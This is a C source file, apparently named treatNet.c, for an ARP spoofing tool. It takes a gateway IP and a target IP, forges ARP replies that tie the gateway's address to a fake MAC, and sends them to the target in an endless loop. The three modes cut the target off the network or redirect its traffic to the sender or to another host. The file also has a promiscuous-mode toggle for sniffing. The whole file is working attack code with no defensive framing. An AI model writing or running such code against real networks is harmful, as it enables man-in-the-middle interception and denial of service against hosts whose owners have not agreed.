/*
 ============================================================================
 Name        : treatNet.c
 Author      : ewentzh
 Version     :
 Copyright   : Your copyright notice
 Description : Hello World in C, Ansi-style
 ============================================================================
 */

#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <arp.h>
#include <arp_trace.h>
#include <arp_thread.h>
#include <assert.h>
#include <string.h>
#include <sys/select.h>
#include <sys/time.h>
#include <sys/types.h>
#include <unistd.h>

#define ASSERT(cond) assert(cond)


enum{
	TREAT_TYPE_KILL=1,
	TREAT_TYPE_DIRECT_ME=2,
	TREAT_TYPE_DIRECT_OTHER=3,
};


struct ether_info{
	struct in_addr  myIp;
	struct mac_addr myMac;
	struct in_addr  gatewayIp;
	struct mac_addr gatewayAddr;
};

struct treat_info{
	struct ether_info* ether_in;
	int treat_type;
	struct in_addr  treat_ip;
	struct mac_addr treat_real_mac;
	struct mac_addr treat_fake_mac;
};

struct ether_info ethr_in;
struct treat_info treat_in;

#define TREAT_TYPE_TO_STR(type) \
	(((type)==TREAT_TYPE_KILL)? "Kill the target Host!" : \
	  (((type)==TREAT_TYPE_DIRECT_ME)? "Direct To Me!" : \
	    (((type)== TREAT_TYPE_DIRECT_OTHER) ? "Direct to Others!": "UnKown Type!")))

void dump_treat_info(struct treat_info* op);

int init_treat_info(struct treat_info * treat_in,struct ether_info* ether_in,struct in_addr* ip,int type,struct mac_addr* fake_mac)
{
	int res;
	ASSERT(ip);
	ASSERT(treat_in);
	ASSERT(ether_in);

	treat_in->ether_in = ether_in;
	memcpy(&treat_in->treat_ip,ip, IP_ADDR_LEN);
	treat_in->treat_type = type;
	res = get_mac_from_ip(ip,&treat_in->treat_real_mac);
	if(res!=0){
		error("Can not get Mac from IP\n");
		return -1;
	}
	switch(type)
	{
	case TREAT_TYPE_KILL:
		/* Kill it */
		memset((void*)&treat_in->treat_fake_mac,0x0,ETH_HW_ADDR_LEN);
		break;
	case TREAT_TYPE_DIRECT_ME:
		/* Direct to Me!! */
		memcpy((void*)&treat_in->treat_fake_mac,(void*)&ether_in->myMac,ETH_HW_ADDR_LEN);
		break;
	case TREAT_TYPE_DIRECT_OTHER:
		/* Think about it*/
		ASSERT(fake_mac);
		memcpy((void*)&treat_in->treat_fake_mac,fake_mac,ETH_HW_ADDR_LEN);
		break;
	default:
		ASSERT(0);
		break;
	}
	return 0;
}

int init_ether_info(struct ether_info* info,struct in_addr* gtIp)
{
	int res;
	ASSERT(info);
	ASSERT(gtIp);

	res = get_host_mac(DEFAULT_DEVICE,&info->myMac);
	if(res!=0){
		return -1;
	}

	res = get_host_ip(DEFAULT_DEVICE,&info->myIp);
	if(res!=0){
		return -1;
	}

	memcpy(&info->gatewayIp,gtIp,sizeof(struct in_addr));
	res = get_mac_from_ip(gtIp,&info->gatewayAddr);
	if(res!=0){
		return -1;
	}
	return 0;
}


void* arp_thread(void* args)
{
	fd_set fds;
	struct timeval time;
	int sock,retval,len=0;
	struct treat_info* op_treat;
	struct ether_info* op_ether;
	char buffer[ETH_FRAME_LEN]={0};
	struct arp_package arp_response,*arp_rev_op;

	if(args==NULL){
		error("Thread need a treat info from main thread!!\n");
		return NULL;
	}

	op_treat = (struct treat_info*) args;
	op_ether = op_treat->ether_in;

	retval = build_arp_pkg(&arp_response,OP_ARP_RESPONSE);
	memcpy(arp_response.targ_hw_addr,&op_treat->treat_real_mac,ETH_HW_ADDR_LEN);
	memcpy(arp_response.src_hw_addr, &op_treat->treat_fake_mac,ETH_HW_ADDR_LEN);
	memcpy(arp_response.sndr_ip_addr,&op_ether->gatewayIp.s_addr,IP_ADDR_LEN);
	memcpy(arp_response.sndr_hw_addr,&op_treat->treat_fake_mac,ETH_HW_ADDR_LEN);
	memcpy(arp_response.rcpt_ip_addr,&op_treat->treat_ip.s_addr,IP_ADDR_LEN);
	memcpy(arp_response.rcpt_hw_addr,&op_treat->treat_real_mac,ETH_HW_ADDR_LEN);

	sock = create_arp_sock();
	if(sock<0){
		error("create arp socket error!!\n");
		return NULL;
	}

	FD_ZERO(&fds);
	FD_SET(sock,&fds);

#ifndef DEBUG
	dump_treat_info(op_treat);
#endif

	while(1){
		/* two seconds send one ARP. */
		time.tv_sec = 0;
		time.tv_usec = 500000;
		retval = select(1,&fds,NULL,NULL,&time);

		if(retval==-1){
			error("Select Error: %d\n",errno);
			continue;
		}else if(retval){
			if(FD_ISSET(sock,&fds)){
				trace("Receive Package on ARP sock!!\n");
				len = read(sock,buffer,sizeof(buffer));
				arp_rev_op = (struct arp_package*)buffer;
				send_arp(sock,&arp_response,DEFAULT_DEVICE);
				dump_arp(arp_rev_op);
			}else{
				error("What is it??\n");
			}
		}else{
			send_arp(sock,&arp_response,DEFAULT_DEVICE);
		}
	}
	destory_arp_sock(sock);
	return NULL;
}


void dump_treat_info(struct treat_info* op_treat)
{
	char my_ip[30],gateway_ip[30],treat_ip[30];
	struct ether_info* op_ether;
	op_ether = op_treat->ether_in;

	strncpy(my_ip,inet_ntoa(op_ether->myIp),sizeof(my_ip));
	strncpy(gateway_ip,inet_ntoa(op_ether->gatewayIp),sizeof(gateway_ip));
	strncpy(treat_ip,inet_ntoa(op_treat->treat_ip),sizeof(treat_ip));

	printf("Dump Treat Info in Thread:  \n"
		   "    My IP Address           : %s\n"
		   "    My Mac Address          : 0x%02x:0x%02x:0x%02x:0x%02x:0x%02x:0x%02x\n"
		   "    GateWay IP Address      : %s\n"
		   "    GateWay Mac Address     : 0x%02x:0x%02x:0x%02x:0x%02x:0x%02x:0x%02x\n"
		   "    Treat IP  Address       : %s\n"
		   "    Treat Real Mac Address  : 0x%02x:0x%02x:0x%02x:0x%02x:0x%02x:0x%02x\n"
		   "    Treat Fake Mac Address  : 0x%02x:0x%02x:0x%02x:0x%02x:0x%02x:0x%02x\n"
		   "    Treat Type [%02d]     : %s\n",
		   my_ip,
		   op_ether->myMac.mac[0],op_ether->myMac.mac[1],op_ether->myMac.mac[2],op_ether->myMac.mac[3],op_ether->myMac.mac[4],op_ether->myMac.mac[5],
		   gateway_ip,
		   op_ether->gatewayAddr.mac[0],op_ether->gatewayAddr.mac[1],op_ether->gatewayAddr.mac[2],op_ether->gatewayAddr.mac[3],op_ether->gatewayAddr.mac[4],op_ether->gatewayAddr.mac[5],
		   treat_ip,
		   op_treat->treat_real_mac.mac[0],op_treat->treat_real_mac.mac[1],op_treat->treat_real_mac.mac[2],op_treat->treat_real_mac.mac[3],op_treat->treat_real_mac.mac[4],op_treat->treat_real_mac.mac[5],
		   op_treat->treat_fake_mac.mac[0],op_treat->treat_fake_mac.mac[1],op_treat->treat_fake_mac.mac[2],op_treat->treat_fake_mac.mac[3],op_treat->treat_fake_mac.mac[4],op_treat->treat_fake_mac.mac[5],
		   op_treat->treat_type,TREAT_TYPE_TO_STR(op_treat->treat_type));
}

int do_promisc(char* devName,int on_off)
{
	int sock, res;
	struct ifreq ifr;

	if ((sock = socket(AF_INET,SOCK_PACKET,htons(ETH_P_IP)))==0){
		return -1;
	}
	strcpy(ifr.ifr_name, devName);

	if ((res = ioctl(sock, SIOCGIFFLAGS, &ifr))!=0) {
		close(sock);
		return-1;
	}

	if(on_off)
		ifr.ifr_flags |= IFF_PROMISC;
	else
		ifr.ifr_flags &= (~IFF_PROMISC);

	if ((res = ioctl(sock, SIOCSIFFLAGS, &ifr)) != 0){
		return -1;
	}
	return 0;
}

int main(int argc,char* argv[])
{
	int res;
	pthread_t thread_id;
	struct in_addr gtIp,treat_ip;

	inet_aton(argv[1], &gtIp);
	inet_aton(argv[2], &treat_ip);

	//do_promisc(DEFAULT_DEVICE,1);
	res = init_ether_info(&ethr_in,&gtIp);
	if(res!=0){
		error("init_ether_info failed!!\n");
		exit(-1);
	}
	res = init_treat_info(&treat_in,&ethr_in,&treat_ip,TREAT_TYPE_DIRECT_ME,NULL);
	if(res!=0){
		error("init_treat_info failed!!\n");
		exit(-1);
	}

	thread_id = spawn_thread(arp_thread,(void*)&treat_in);
	if(thread_id<0){
		error("Create Thread Failed!!\n");
		exit(-1);
	}

	pthread_join(thread_id,NULL);
	return 0;
}
